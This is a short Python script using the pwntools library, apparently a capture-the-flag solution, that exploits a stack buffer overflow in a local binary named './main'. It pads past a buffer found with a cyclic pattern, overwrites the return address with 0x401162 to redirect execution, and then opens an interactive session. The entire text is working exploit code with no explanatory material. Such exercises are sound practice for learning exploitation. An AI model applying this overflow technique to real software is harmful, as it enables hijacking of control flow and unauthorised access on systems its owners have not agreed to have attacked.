from pwn import *

p = process('./main')

p.recvline()

raw_input('attach gdb')
offset = cyclic_find('ajaa')
pad = 'A' * offset

p.sendline('1234\0' + pad + p64(0x401162))

p.interactive()
